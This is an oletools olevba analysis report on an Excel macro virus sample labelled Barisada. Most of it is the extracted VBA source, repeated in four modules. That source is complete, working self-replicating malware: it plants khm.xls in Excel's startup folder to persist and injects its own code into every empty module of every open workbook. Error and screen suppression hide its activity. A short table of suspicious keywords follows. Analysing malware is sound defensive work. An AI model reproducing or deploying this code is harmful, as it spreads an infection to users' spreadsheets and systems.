olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Barisada-b8e42e5a89bfad9386b0d7e8eb72c46a23b29df1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Barisada-b8e42e5a89bfad9386b0d7e8eb72c46a23b29df1 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
'xlstart폴더(StartupPath)에 "khm.xls"가 없으면 새로 만든다.
 myfile = Dir(Application.StartupPath & "\khm.xls")
 If myfile <> "khm.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\khm.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 
'ThisWorkbook Component에 코드가 있으면 vcode변수에 코드를 저장
For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
'코드가 없는 Component를 찾아서 vcode변수값을 입력
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "khm.xls" Then Workbooks("khm.xls").Close savechanges:=True
 
End Sub






















































-------------------------------------------------------------------------------
VBA MACRO Sheet11.cls 
in file: Virus.MSExcel.Barisada-b8e42e5a89bfad9386b0d7e8eb72c46a23b29df1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
'xlstart폴더(StartupPath)에 "khm.xls"가 없으면 새로 만든다.
 myfile = Dir(Application.StartupPath & "\khm.xls")
 If myfile <> "khm.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\khm.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 
'ThisWorkbook Component에 코드가 있으면 vcode변수에 코드를 저장
For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
'코드가 없는 Component를 찾아서 vcode변수값을 입력
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "khm.xls" Then Workbooks("khm.xls").Close savechanges:=True
 
End Sub






















































-------------------------------------------------------------------------------
VBA MACRO Sheet111.cls 
in file: Virus.MSExcel.Barisada-b8e42e5a89bfad9386b0d7e8eb72c46a23b29df1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet111'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
'xlstart폴더(StartupPath)에 "khm.xls"가 없으면 새로 만든다.
 myfile = Dir(Application.StartupPath & "\khm.xls")
 If myfile <> "khm.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\khm.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 
'ThisWorkbook Component에 코드가 있으면 vcode변수에 코드를 저장
For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
'코드가 없는 Component를 찾아서 vcode변수값을 입력
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "khm.xls" Then Workbooks("khm.xls").Close savechanges:=True
 
End Sub






















































-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Barisada-b8e42e5a89bfad9386b0d7e8eb72c46a23b29df1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
'xlstart폴더(StartupPath)에 "khm.xls"가 없으면 새로 만든다.
 myfile = Dir(Application.StartupPath & "\khm.xls")
 If myfile <> "khm.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\khm.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 
'ThisWorkbook Component에 코드가 있으면 vcode변수에 코드를 저장
For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
'코드가 없는 Component를 찾아서 vcode변수값을 입력
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "khm.xls" Then Workbooks("khm.xls").Close savechanges:=True
 
End Sub






















































-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  ³x
' 0085     52 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Ç¨Ì  „½´ÌÄ³Ì¸  È©Æ€
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  CAMER
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

